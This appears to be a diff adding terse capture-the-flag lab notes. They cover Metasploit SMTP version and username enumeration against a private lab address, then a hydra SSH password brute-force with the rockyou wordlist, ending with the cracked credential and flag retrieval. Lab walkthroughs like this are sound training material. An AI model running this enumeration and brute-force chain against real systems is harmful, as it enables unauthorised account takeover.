@@ -1,0 +1,25 @@
+search smtp_version -> 0  auxiliary/scanner/smtp/smtp_version
+
+use 0 -> options ( use module)
+
+set rhosts 10.10.126.4
+
+run or exploit -z
+
+search smtp_enum -> 0  auxiliary/scanner/smtp/smtp_enum 
+
+sudo apt install seclists -> need a seclist from wordlists
+
+set USER_FILE /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt
+
+run the module -> get username: administrator
+
+using hydra to brute-force password :
+
+hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.126.4 ssh
+
+get the password : alejandro
+
+login-> read flag.
+
+
